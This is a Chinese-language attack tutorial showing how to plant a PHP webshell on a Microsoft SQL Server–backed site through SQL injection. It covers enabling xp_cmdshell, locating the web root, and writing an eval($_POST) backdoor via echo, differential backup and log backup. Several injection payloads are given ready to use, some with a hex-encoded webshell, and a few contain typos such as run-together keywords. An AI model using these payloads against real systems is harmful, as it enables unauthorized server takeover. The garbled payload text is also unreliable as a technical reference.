# webshell写入

## **1、必备条件**

① 有相应的权限db\_owner  
② 获得Web目录的绝对路径

## **2、写入方法**

向MSSQL写入WebShell的方法一共有种：利用xp\_cmdshell命令、差异备份写入shell、log备份写入shell。

## **3、使用XP\_cmdshell写入Webshell**

### （1）实验前准备

首先我们需要查找网站目录的绝对路径，查找绝对路径的方法有5种：

1. 通过报错信息查找；
2. 通过目录爆破猜解；
3. 通过旁站的目录确定；
4. 通过存储过程来搜索；
5. 通过读取配置文件查找。

其中通过存储过程来搜索，SQLServer提供了两种方法：xp\_cmdshell和xp\_dirtree

`execute master..xp_dirtree ‘c:’;` 可以查出所有c:\下的文件、目录、子目录。

![](https://image.3001.net/images/20200810/1597038222.png!small)

在真实环境中时，我们执行execute可能并不能得到回显信息，但我们可以在注入点处新建一张表，然后将xp\_dirtree查询到的信息插入其中，再查询这张表即可得相应的绝对路径了。

Xp\_cmdshell是一个更为有效的查询绝对路径的函数，但是目前已经被SQLServer默认关闭了，但我们可以使用如下命令启用这个选项。

```text
EXEC sp_configure 'show advanced options',1;//允许修改高级参数RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; //打开xp_cmdshell扩展RECONFIGURE;--
```

![](https://image.3001.net/images/20200810/1597038261.png!small)

开启了xp\_cmsshell之后我们就可以执行CMD命令了，例如:

```text
for /r c:\ %i in (1*.php) do @echo %i
```

就可以查询c:\目录下的所有符合1\*.php的文件，同理，在实际应用中，我们也是新建一个表，并将xp\_cmdshell查询到的信息插入后，再次查询即可。

![](https://image.3001.net/images/20200810/1597038271.png!small)

### **（2）使用xp\_cmdshell写入WebShell**

我们可以通过xp\_cmdshell执行系统CMD命令，例如我们可以使用CMD中的echo命令，将WebShell的代码写入到网站目录下，所以我们必须提前知道Web目录的绝对路径。

```text
PAYLOAD：1’;execmaster..xp_cmdshell'echo^<?phpeval($_POST["pass"]);?^>>F:\\PhpStudy20180211\\PHPTutorial\\WWW\\cmd.php';
```

![](https://image.3001.net/images/20200810/1597038305.png!small)

### **（3）使用差异备份写入WebShell**

首先对某一数据库进行备份。

```text
PAYLOAD：id = 1’;backup database 库名 to disk = 'F:\\PhpStudy20180211\\PHPTutorial\\WWW\\back.bak';
```

![](https://image.3001.net/images/20200810/1597038328.png!small)

其次将WebShell代码写入数据库中,

PAYLOAD：`id = 1’; create table cybk([cmd] [image]);#`创建一个新表

PAYLOAD：`id=1’;insertintocybk(cmd)`

```text
vaues(0x3C3F706870206576616C28245F504F53545B2770617373275D293B203F3E);
#将WebShell的代码转换成ASCII码
```

![](https://image.3001.net/images/20200810/1597038350.png!small)![](https://image.3001.net/images/20200810/1597038364.png!small)

最后将此数据库进行差异备份，这样其中就会包含刚刚写入的WebShell代码。

```text
PAYLOAD：id=1’; backup database library todisk='F:\\PhpStudy20180211\\PHPTutorial\\WWW\\cybk.php' WITHDIFFERENTIAL,FORMAT;
```

![](https://image.3001.net/images/20200810/1597038444.png!small)

![](https://image.3001.net/images/20200810/1597038383.png!small)

### **（4）使用log备份写入WebShell**

使用Log备份写入WebShell的要求是他的数据库已经备份过，而且要选择完整模式的恢复模式，相比较差异备份而言，使用Log备份文件会小的多。

首先需要将数据库设置为完整恢复模式，然后创建一个新表，将WebShell用Ascii编码后写入其中，然后将该数据库的日志信息导出到Web目录，即可。

![](https://image.3001.net/images/20200810/1597038468.png!small)

可在Web目录下找到导出的日志文件，其中包含了WebShell的代码。

![](https://image.3001.net/images/20200810/1597038503.png!small)

## 

